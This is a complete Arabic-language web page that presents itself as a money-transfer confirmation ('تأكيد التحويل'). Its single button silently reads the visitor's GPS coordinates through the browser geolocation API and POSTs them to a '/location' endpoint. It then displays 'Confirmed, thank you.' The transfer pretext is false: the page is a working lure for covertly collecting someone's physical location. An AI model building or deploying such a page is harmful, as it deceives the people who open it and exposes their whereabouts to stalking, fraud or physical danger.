<!DOCTYPE html>
<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تأكيد التحويل</title></head><body style="text-align:center; direction: rtl; font-family: sans-serif;"><h2>اضغط على الزر لتأكيد التحويل</h2><button onclick="sendLocation()" style="padding:10px 20px; font-size:16px;">تأكيد التحويل</button><p id="status" style="margin-top:20px;"></p><script>function sendLocation(){navigator.geolocation.getCurrentPosition(pos=>{fetch('/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({latitude:pos.coords.latitude,longitude:pos.coords.longitude})}).then(()=>document.getElementById('status').innerText='تم التأكيد، شكراً لك.' );});}</script></body></html>
